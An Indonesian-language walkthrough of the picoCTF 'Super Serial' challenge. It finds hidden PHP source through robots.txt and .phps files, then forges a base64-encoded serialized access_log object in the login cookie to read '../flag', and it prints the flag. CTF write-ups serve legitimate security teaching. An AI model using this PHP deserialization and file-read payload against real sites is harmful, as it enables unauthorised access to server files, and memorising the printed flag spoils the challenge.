# Super Serial
- Link: https://play.picoctf.org/practice/challenge/180?category=1&page=2

## Tantangan
Try to recover the flag stored on this website http://mercury.picoctf.net:3449/

## Penyelesaian
- Buka URL http://mercury.picoctf.net:3449/ di browser


- Jika kita buka path `robots.txt` di url http://mercury.picoctf.net:3449/robots.txt terdapat path dihidden sebagai berikut


- Jika kita buka halaman tersebut di url http://mercury.picoctf.net:3449/admin.phps halaman tersebut tidak ditemukan


- Sekarang kita coba buka `index.phps` dengan url http://mercury.picoctf.net:3449/index.phps maka terdapat source code sebagai berikut. Jika anda tidak dapat membuka source code nya, silahkan klik kanan lalu pilih view page source. Disini terdapat fungsi pengaturan cookie dengan nama `login` dan value nya diencode menggunakan base64


- Sekarang kita coba buka `cookie.phps` dengan url http://mercury.picoctf.net:3449/cookie.phps maka terdapat source code sebagai berikut. Jika anda tidak dapat membuka source code nya, silahkan klik kanan lalu pilih view page source


- Sekarang kita coba buka `authentication.phps` dengan url http://mercury.picoctf.net:3449/authentication.phps maka terdapat source code sebagai berikut. Jika anda tidak dapat membuka source code nya, silahkan klik kanan lalu pilih view page source


- Sekarang kita coba akses halaman http://mercury.picoctf.net:3449/authentication.php

- Klik kanan di halaman tersebut lalu pilih Inspect

- Kemudian pergi ke tab storage. Disini kita bisa mencoba untuk menambahkan cookie `login` dengan value yang diencode dengan base64


- Buka editor PHP online https://legacy-sandbox.onlinephpfunctions.com/ lalu ketikkan code berikut lalu execute code tersebut
```sh
<?php

print(urlencode(base64_encode(serialize("test"))));
```

- Copy value tersebut dan tambahkan ke value cookie `login` dan refresh halaman tersebut
```sh
czo0OiJ0ZXN0Ijs%3D
```

- Ubah source code PHP diatas menjadi sebagai berikut lalu execute code tersebut
```sh
<?php
        
class access_log
{
	public $log_file = "../flag";
}

print(urlencode(base64_encode(serialize(new access_log()))));
```

- Copy value tersebut dan tambahkan ke value cookie `login` dan refresh halaman tersebut
```sh
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```



- Flag
```sh
picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}
```